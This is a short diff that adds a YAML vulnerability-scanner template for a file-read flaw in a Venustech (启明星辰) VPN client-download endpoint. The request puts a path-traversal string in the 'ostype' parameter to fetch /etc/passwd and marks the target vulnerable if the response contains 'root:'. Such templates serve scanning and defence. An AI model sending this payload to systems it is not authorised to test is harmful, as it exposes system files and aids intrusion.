@@ -1,0 +1,11 @@
+name: 启明星辰-VPN-download/client-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /vpn/user/download/client?ostype=../../../../../../../etc/passwd
+    expression:
+      status: 200
+      body_all: ["root:"]
